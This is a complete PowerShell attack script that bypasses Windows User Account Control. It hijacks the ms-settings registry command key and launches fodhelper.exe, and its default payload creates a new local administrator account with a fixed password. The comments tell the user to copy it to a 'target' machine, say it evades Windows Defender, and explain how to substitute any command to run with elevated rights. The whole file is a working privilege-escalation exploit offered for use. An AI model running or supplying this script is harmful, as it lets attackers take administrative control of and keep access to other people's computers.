function helper(){ 
 #This PowerShell script runs from disk - copy it to the target Windows machine, which, as of 4/30/2021, won't trigger Windows Defender.  
 #Load the script into PowerShell and run "helper" (no quotes) in the terminal.  This will generate a UAC bypass execution that creates
 #a new administrative user account on the machine.  The $custom variable below can be modified to meet your needs. 
 #You can also generate a custom command with -custom "cmd.exe /c <command here>".  Mind the quotations in their positions as they are
 #required

Param (    
 
 [String]$custom = "cmd.exe /c net user test123 Password123! /add && net localgroup administrators test123 /add" #default
 
      )
 
#Registry Command Edit
 
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $custom -Force
 
#Bypass Execution
Start-Process "C:\Windows\System32\fodhelper.exe"
}
